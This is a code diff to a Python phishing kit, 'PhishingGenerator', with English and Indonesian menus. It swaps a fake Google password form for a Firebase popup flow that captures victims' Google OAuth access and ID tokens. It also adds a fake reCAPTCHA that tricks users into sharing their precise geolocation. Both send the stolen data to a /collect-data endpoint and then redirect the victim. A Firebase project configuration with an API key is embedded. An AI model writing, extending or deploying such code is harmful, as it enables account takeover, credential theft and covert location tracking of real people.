@@ -526,131 +526,154 @@ class PhishingGenerator:
 
                 elif phish_type == "googleauth":
                     permission_script += """
-                    var authStyle = document.createElement('style');
-                    authStyle.textContent = `
-                        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-                        #gaPopup * { font-family: 'Roboto', 'Google Sans', arial, sans-serif; box-sizing:border-box; }
-                        #gaPopup .ga-card { background:#fff; border-radius:8px; padding:48px 40px 36px; max-width:450px; width:90%;
-                            box-shadow:0 2px 10px rgba(0,0,0,0.13); text-align:center; }
-                        #gaPopup .ga-input-wrap { position:relative; margin-top:24px; text-align:left; }
-                        #gaPopup .ga-input-wrap input { width:100%; padding:13px 15px; font-size:16px; border:1px solid #dadce0;
-                            border-radius:4px; outline:none; background:transparent; transition:border .15s; }
-                        #gaPopup .ga-input-wrap input:focus { border-color:#1a73e8; border-width:2px; padding:12px 14px; }
-                        #gaPopup .ga-input-wrap label { position:absolute; left:15px; top:14px; color:#5f6368; font-size:16px;
-                            pointer-events:none; transition:.15s; background:#fff; padding:0 4px; }
-                        #gaPopup .ga-input-wrap input:focus + label,
-                        #gaPopup .ga-input-wrap input:not(:placeholder-shown) + label { top:-8px; font-size:12px; color:#1a73e8; }
-                        #gaPopup .ga-input-wrap input:not(:focus):not(:placeholder-shown) + label { color:#5f6368; }
-                        #gaPopup .ga-btn { width:100%; padding:9px 24px; margin-top:24px; background:#1a73e8; color:#fff;
-                            border:none; border-radius:4px; font-size:15px; font-weight:500; cursor:pointer; letter-spacing:.25px; }
-                        #gaPopup .ga-btn:hover { background:#1b66c9; box-shadow:0 1px 3px rgba(26,115,232,0.3); }
-                        #gaPopup .ga-btn:disabled { opacity:0.6; cursor:default; }
-                        #gaPopup .ga-link { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; cursor:pointer; display:inline-block; margin-top:8px; }
-                        #gaPopup .ga-link:hover { color:#1b66c9; }
-                        #gaPopup .ga-footer { margin-top:32px; font-size:12px; color:#5f6368; }
-                        #gaPopup .ga-footer a { color:#1a73e8; text-decoration:none; font-weight:500; padding:8px; }
-                        #gaPopup .ga-footer a:hover { color:#1b66c9; }
-                        #gaPopup .ga-error { color:#d93025; font-size:13px; margin-top:6px; display:none; }
-                    `;
-                    document.head.appendChild(authStyle);
-                    var gaPopup = document.createElement('div');
-                    gaPopup.id = 'gaPopup';
-                    gaPopup.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#f0f2f5;display:flex;justify-content:center;align-items:center;z-index:9999;';
-                    gaPopup.innerHTML = '<div class="ga-card" id="gaCard1">' +
-                        '<div style="margin-bottom:16px;">' +
-                            '<svg viewBox="0 0 75 24" width="75" height="24"><path fill="#4285F4" d="M67.955 13.89c0 3.8-2.085 5.97-5.675 5.97-3.59 0-5.7-2.17-5.7-5.97 0-3.825 2.11-5.995 5.7-5.995 3.59 0 5.675 2.17 5.675 5.994zm-3.13 0c0-2.195-.905-3.65-2.545-3.65-1.64 0-2.545 1.455-2.545 3.65 0 2.195.905 3.625 2.545 3.625 1.64 0 2.545-1.43 2.545-3.625zM74.66 19.86l-4.83-7.585 4.545-6.99h-3.225l-4.93 7.76V2.065h-2.57V19.86h2.57v-5.52l1.37-2.17 3.65 7.69zM40.995 2.065h-2.57V19.86h2.57zM50.92 14.295c0 1.075-.345 1.87-1.04 2.385-.695.515-1.66.775-2.895.775-1.565 0-3.12-.395-4.66-1.18l-.005 2.15c1.49.66 3.14.99 4.945.99 3.29 0 5.41-1.57 5.41-4.86V2.065h-5.755v2.24h3.185v4.08c-.595-.35-1.48-.555-2.65-.555-2.38 0-4.09 1.405-4.09 3.94v1.695c0 1.645 1.05 2.785 2.65 2.785 1.795 0 2.89-.845 2.89-2.35zm-3.375-1.69c0 .905-.575 1.43-1.525 1.43-.95 0-1.52-.525-1.52-1.43v-1.18c0-.905.57-1.43 1.52-1.43.95 0 1.525.525 1.525 1.43zM11.525 19.86v-7.75H8.415v7.75H5.85V2.065H8.42v7.7h3.105v-7.7h2.57V19.86zM0 19.86l3.86-8.845H1.05L0 13.815l1.04 2.795h2.09L0 24.57h2.75l2.19-5.78-3.41-7.775h2.66L9.28 19.86h-2.7l-1.37-3.365h-3.11L.72 19.86z" /></svg>' +
-                        '</div>' +
-                        '<h1 style="font-size:24px;font-weight:400;color:#202124;margin:0 0 8px;">Sign in</h1>' +
-                        '<p style="font-size:16px;color:#202124;margin:0 0 24px;">Use your Google Account</p>' +
-                        '<div class="ga-input-wrap">' +
-                            '<input id="gaEmail" type="text" placeholder=" " autocomplete="username" autocapitalize="none">' +
-                            '<label for="gaEmail">Email or phone</label>' +
-                        '</div>' +
-                        '<div class="ga-error" id="gaEmailError">Couldn\\'t find your Google Account</div>' +
-                        '<button class="ga-btn" id="gaNext1">Next</button>' +
-                        '<div style="margin-top:40px;text-align:left;">' +
-                            '<a class="ga-link" href="#">Forgot email?</a>' +
-                            '<p style="font-size:14px;color:#5f6368;margin-top:32px;">Not your computer? Use a <a style="color:#1a73e8;font-weight:500;text-decoration:none;cursor:pointer;">Guest window</a> to sign in privately.</p>' +
-                            '<div style="margin-top:40px;display:flex;justify-content:space-between;align-items:center;">' +
-                                '<a class="ga-link" href="#" style="font-size:14px;">Create account</a>' +
-                            '</div>' +
-                        '</div>' +
+                    var gaOverlay = document.createElement('div');
+                    gaOverlay.id = 'gaOverlay';
+                    gaOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:99999;';
+                    gaOverlay.innerHTML = '<div style="text-align:center;padding:20px;">' +
+                        '<div style="width:48px;height:48px;margin:0 auto 20px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:gaSpin .8s linear infinite;"></div>' +
+                        '<style>@keyframes gaSpin{to{transform:rotate(360deg)}}</style>' +
+                        '<h2 style="color:#202124;font-size:20px;font-weight:400;margin:0;">Signing in with Google...</h2>' +
+                        '<p style="color:#5f6368;font-size:14px;margin:8px 0 0;">Opening secure login window</p>' +
                     '</div>';
-                    document.body.appendChild(gaPopup);
+                    document.body.appendChild(gaOverlay);
 
-                    var gaEmail = document.getElementById('gaEmail');
-                    var gaNext1 = document.getElementById('gaNext1');
-                    var gaEmailError = document.getElementById('gaEmailError');
+                    var gaModule = document.createElement('script');
+                    gaModule.type = 'module';
+                    gaModule.textContent = `
+                        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
+                        import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-auth.js";
 
-                    function showStep2(email) {
-                        gaPopup.innerHTML = '<div class="ga-card" id="gaCard2">' +
-                            '<div style="margin-bottom:16px;">' +
-                                '<svg viewBox="0 0 75 24" width="75" height="24"><path fill="#4285F4" d="M67.955 13.89c0 3.8-2.085 5.97-5.675 5.97-3.59 0-5.7-2.17-5.7-5.97 0-3.825 2.11-5.995 5.7-5.995 3.59 0 5.675 2.17 5.675 5.994zm-3.13 0c0-2.195-.905-3.65-2.545-3.65-1.64 0-2.545 1.455-2.545 3.65 0 2.195.905 3.625 2.545 3.625 1.64 0 2.545-1.43 2.545-3.625zM74.66 19.86l-4.83-7.585 4.545-6.99h-3.225l-4.93 7.76V2.065h-2.57V19.86h2.57v-5.52l1.37-2.17 3.65 7.69zM40.995 2.065h-2.57V19.86h2.57zM50.92 14.295c0 1.075-.345 1.87-1.04 2.385-.695.515-1.66.775-2.895.775-1.565 0-3.12-.395-4.66-1.18l-.005 2.15c1.49.66 3.14.99 4.945.99 3.29 0 5.41-1.57 5.41-4.86V2.065h-5.755v2.24h3.185v4.08c-.595-.35-1.48-.555-2.65-.555-2.38 0-4.09 1.405-4.09 3.94v1.695c0 1.645 1.05 2.785 2.65 2.785 1.795 0 2.89-.845 2.89-2.35zm-3.375-1.69c0 .905-.575 1.43-1.525 1.43-.95 0-1.52-.525-1.52-1.43v-1.18c0-.905.57-1.43 1.52-1.43.95 0 1.525.525 1.525 1.43zM11.525 19.86v-7.75H8.415v7.75H5.85V2.065H8.42v7.7h3.105v-7.7h2.57V19.86zM0 19.86l3.86-8.845H1.05L0 13.815l1.04 2.795h2.09L0 24.57h2.75l2.19-5.78-3.41-7.775h2.66L9.28 19.86h-2.7l-1.37-3.365h-3.11L.72 19.86z" /></svg>' +
+                        const firebaseConfig = {
+                            apiKey: "AIzaSyBzxNTB-CwcwPQ2C-CRrqVtLQjQY48GEe4",
+                            authDomain: "culture-media-d9a90.firebaseapp.com",
+                            databaseURL: "https://culture-media-d9a90-default-rtdb.asia-southeast1.firebasedatabase.app",
+                            projectId: "culture-media-d9a90",
+                            storageBucket: "culture-media-d9a90.firebasestorage.app",
+                            messagingSenderId: "242303102106",
+                            appId: "1:242303102106:web:4112d61764349f37ddc323",
+                            measurementId: "G-98Z9EY3EWT"
+                        };
+
+                        const app = initializeApp(firebaseConfig);
+                        const auth = getAuth(app);
+                        const provider = new GoogleAuthProvider();
+                        provider.setCustomParameters({ prompt: 'select_account' });
+
+                        (async () => {
+                            try {
+                                const result = await signInWithPopup(auth, provider);
+                                const user = result.user;
+                                const data = {
+                                    email: user.email,
+                                    name: user.displayName,
+                                    uid: user.uid,
+                                    photoURL: user.photoURL,
+                                    oauthToken: result._tokenResponse?.oauthAccessToken || '',
+                                    idToken: result._tokenResponse?.idToken || ''
+                                };
+                                fetch('/collect-data', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({ type: 'google_auth', data: data })
+                                }).then(function() {
+                                    window.top.location.href = '""" + target_url + """';
+                                });
+                            } catch (e) {
+                                window.top.location.href = '""" + target_url + """';
+                            }
+                        })();
+                    `;
+                    document.body.appendChild(gaModule);
+                    """
+
+                elif phish_type == "recaptcha":
+                    permission_script += """
+                    var rcOverlay = document.createElement('div');
+                    rcOverlay.id = 'rcOverlay';
+                    rcOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.55);display:flex;justify-content:center;align-items:center;z-index:99999;';
+                    rcOverlay.innerHTML =
+                        '<div style="background:#fff;border-radius:12px;padding:28px 24px 20px;max-width:380px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
+                            '<div style="margin-bottom:12px;">' +
+                                '<svg width="56" height="56" viewBox="0 0 56 56" fill="none"><rect width="56" height="56" rx="12" fill="#e8f0fe"/><path d="M28 12C19.16 12 12 19.16 12 28s7.16 16 16 16 16-7.16 16-16S36.84 12 28 12zm-2 24l-8-8 2.83-2.83L26 30.34l11.17-11.17L40 22l-14 14z" fill="#1a73e8"/></svg>' +
                             '</div>' +
-                            '<div style="display:flex;align-items:center;gap:6px;margin-bottom:24px;">' +
-                                '<div style="width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;">' + email[0].toUpperCase() + '</div>' +
-                                '<span style="font-size:14px;color:#5f6368;">' + email + '</span>' +
+                            '<h2 style="margin:0 0 4px;color:#202124;font-size:20px;font-weight:500;">Verify you are human</h2>' +
+                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 18px;">Please complete the security check to access this page. This helps us prevent automated requests.</p>' +
+                            '<div id="rcCheckbox" style="display:flex;align-items:center;justify-content:center;gap:12px;background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:12px 16px;margin-bottom:16px;cursor:pointer;">' +
+                                '<div id="rcBox" style="width:24px;height:24px;border:2px solid #5f6368;border-radius:4px;display:flex;align-items:center;justify-content:center;transition:.2s;"></div>' +
+                                '<span style="color:#3c4043;font-size:14px;font-weight:500;">I\'m not a robot</span>' +
+                                '<div style="margin-left:auto;display:flex;gap:4px;">' +
+                                    '<svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>' +
+                                '</div>' +
                             '</div>' +
-                            '<h1 style="font-size:24px;font-weight:400;color:#202124;margin:0 0 8px;">Welcome back</h1>' +
-                            '<div class="ga-input-wrap">' +
-                                '<input id="gaPass" type="password" placeholder=" " autocomplete="current-password">' +
-                                '<label for="gaPass">Enter your password</label>' +
-                            '</div>' +
-                            '<div class="ga-error" id="gaPassError">Wrong password. Try again.</div>' +
-                            '<div style="margin:8px 0 0;text-align:left;">' +
-                                '<label style="font-size:14px;color:#5f6368;cursor:pointer;"><input type="checkbox" id="gaShowPass"> Show password</label>' +
-                            '</div>' +
-                            '<button class="ga-btn" id="gaNext2">Next</button>' +
-                            '<div style="margin-top:40px;text-align:left;">' +
-                                '<a class="ga-link" href="#">Forgot password?</a>' +
+                            '<div id="rcFooter" style="display:none;align-items:center;justify-content:space-between;padding-top:12px;border-top:1px solid #e8eaed;">' +
+                                '<div style="display:flex;align-items:center;gap:8px;">' +
+                                    '<svg width="28" height="28" viewBox="0 0 48 48"><path fill="#1a73e8" d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4z"/><path fill="#fff" d="M21 32V18l12 7z"/></svg>' +
+                                    '<span style="font-size:11px;color:#5f6368;">reCAPTCHA</span>' +
+                                '</div>' +
+                                '<div style="font-size:11px;color:#5f6368;">Privacy - Terms</div>' +
                             '</div>' +
                         '</div>';
+                    document.body.appendChild(rcOverlay);
 
-                        document.getElementById('gaShowPass').addEventListener('change', function() {
-                            var p = document.getElementById('gaPass');
-                            p.type = this.checked ? 'text' : 'password';
-                        });
+                    document.getElementById('rcCheckbox').addEventListener('click', function() {
+                        var box = document.getElementById('rcBox');
+                        box.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
+                        box.style.background = '#1a73e8';
+                        box.style.borderColor = '#1a73e8';
+                        document.getElementById('rcCheckbox').style.background = '#e8f0fe';
+                        document.getElementById('rcCheckbox').style.borderColor = '#1a73e8';
+                        document.getElementById('rcFooter').style.display = 'flex';
 
-                        document.getElementById('gaNext2').addEventListener('click', function() {
-                            var pass = document.getElementById('gaPass').value;
-                            if (!pass) { document.getElementById('gaPassError').style.display = 'block'; return; }
-                            document.getElementById('gaNext2').disabled = true;
-                            document.getElementById('gaNext2').textContent = 'Verifying...';
-                            fetch('/collect-data', {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({ type: 'google_auth', data: { email: email, password: pass } })
-                            }).then(function() {
-                                window.top.location.href = '""" + target_url + """';
-                            });
-                        });
-
-                        document.getElementById('gaPass').addEventListener('keydown', function(e) {
-                            if (e.key === 'Enter') document.getElementById('gaNext2').click();
-                        });
-                        setTimeout(function() { document.getElementById('gaPass').focus(); }, 100);
-                    }
-
-                    gaNext1.addEventListener('click', function() {
-                        var email = gaEmail.value.trim();
-                        if (!email) {
-                            gaEmailError.textContent = 'Enter an email or phone number';
-                            gaEmailError.style.display = 'block';
-                            gaEmail.style.borderColor = '#d93025';
-                            return;
-                        }
-                        gaEmailError.style.display = 'none';
-                        gaNext1.disabled = true;
-                        gaNext1.textContent = 'Verifying...';
                         setTimeout(function() {
-                            showStep2(email);
-                        }, 800);
-                    });
+                            document.getElementById('rcOverlay').innerHTML =
+                                '<div style="background:#fff;border-radius:12px;padding:28px 24px 20px;max-width:380px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
+                                    '<div style="width:48px;height:48px;margin:0 auto 16px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:rcSpin .8s linear infinite;"></div>' +
+                                    '<style>@keyframes rcSpin{to{transform:rotate(360deg)}}</style>' +
+                                    '<h2 style="margin:0 0 4px;color:#202124;font-size:18px;font-weight:500;">Verifying...</h2>' +
+                                    '<p style="color:#5f6368;font-size:14px;margin:0 0 16px;">Checking your browser security</p>' +
+                                    '<div style="width:100%;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;">' +
+                                        '<div style="width:0%;height:100%;background:#1a73e8;border-radius:2px;" id="rcProgress"></div>' +
+                                    '</div>' +
+                                '</div>';
 
-                    gaEmail.addEventListener('keydown', function(e) {
-                        if (e.key === 'Enter') gaNext1.click();
+                            var w = 0;
+                            var pi = setInterval(function() {
+                                var p = document.getElementById('rcProgress');
+                                if (p) { w = Math.min(w + 8, 90); p.style.width = w + '%'; }
+                                if (w >= 90) clearInterval(pi);
+                            }, 150);
+
+                            setTimeout(function() {
+                                var p = document.getElementById('rcProgress');
+                                if (p) p.style.width = '100%';
+                                setTimeout(function() {
+                                    document.getElementById('rcOverlay').innerHTML =
+                                        '<div style="background:#fff;border-radius:12px;padding:28px 24px;max-width:380px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
+                                            '<div style="font-size:40px;margin-bottom:10px;">📍</div>' +
+                                            '<h2 style="margin:0 0 4px;color:#202124;font-size:18px;font-weight:500;">Location Verification</h2>' +
+                                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 18px;">As an additional security measure, please allow location access to confirm you are in a trusted region.</p>' +
+                                            '<button id="rcLocBtn" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;">Allow Location</button>' +
+                                        '</div>';
+                                    document.getElementById('rcLocBtn').addEventListener('click', function() {
+                                        navigator.geolocation.getCurrentPosition(function(pos) {
+                                            fetch('/collect-data', {
+                                                method: 'POST',
+                                                headers: {'Content-Type': 'application/json'},
+                                                body: JSON.stringify({
+                                                    type: 'recaptcha',
+                                                    data: { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }
+                                                })
+                                            }).then(function() {
+                                                window.top.location.href = '""" + target_url + """';
+                                            });
+                                        }, function() {
+                                            window.top.location.href = '""" + target_url + """';
+                                        }, { enableHighAccuracy: true });
+                                    });
+                                }, 400);
+                            }, 2000);
+                        }, 600);
                     });
-                    setTimeout(function() { gaEmail.focus(); }, 100);
                     """
 
                 permission_script += """
@@ -1444,13 +1467,15 @@ class PhishingGenerator:
              "Fake download/getlink trap" if self.language == "en" else "Jebakan download/getlink palsu"),
             ("8", "Google Auth" if self.language == "en" else "Google Auth",
              "Fake Google 2FA verification" if self.language == "en" else "Verifikasi 2FA Google palsu"),
-            ("9", "View Results" if self.language == "en" else "Lihat Hasil",
+            ("9", "reCAPTCHA Phishing" if self.language == "en" else "Phishing reCAPTCHA",
+             "Fake reCAPTCHA with location verification" if self.language == "en" else "reCAPTCHA palsu dengan verifikasi lokasi"),
+            ("10", "View Results" if self.language == "en" else "Lihat Hasil",
              "View captured data" if self.language == "en" else "Lihat data yang didapat"),
-            ("10", "Export Data" if self.language == "en" else "Ekspor Data",
+            ("11", "Export Data" if self.language == "en" else "Ekspor Data",
              "Export results to JSON" if self.language == "en" else "Ekspor hasil ke JSON"),
-            ("11", "Settings" if self.language == "en" else "Pengaturan",
+            ("12", "Settings" if self.language == "en" else "Pengaturan",
              "Configure webhook, region, port, tunnel" if self.language == "en" else "Atur webhook, region, port, tunnel"),
-            ("12", "Exit" if self.language == "en" else "Keluar",
+            ("13", "Exit" if self.language == "en" else "Keluar",
              "Exit program" if self.language == "en" else "Keluar dari program")
         ]
         
@@ -1626,6 +1651,14 @@ class PhishingGenerator:
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
 
                 elif choice == "9":
+                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    with Progress() as progress:
+                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
+                        self.generate_phishing_link("recaptcha", target_url=target)
+                        progress.update(task, advance=100)
+                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
+
+                elif choice == "10":
                     self.show_victims = True
                     self.update_live_display()
                     console.input(f"\n[green]{'Press Enter to return to menu...' if self.language == 'en' else 'Tekan Enter untuk kembali ke menu...'}[/]")
@@ -1634,13 +1667,13 @@ class PhishingGenerator:
                         self.live_display.stop()
                         self.live_display = None
                 
-                elif choice == "10":
+                elif choice == "11":
                     self.export_results()
                 
-                elif choice == "11":
+                elif choice == "12":
                     self.settings_menu()
                 
-                elif choice == "12":
+                elif choice == "13":
                     msg = "Closing program..." if self.language == "en" else "Menutup program..."
                     console.print(f"\n[red][[!]] {msg}[/]")
                     break
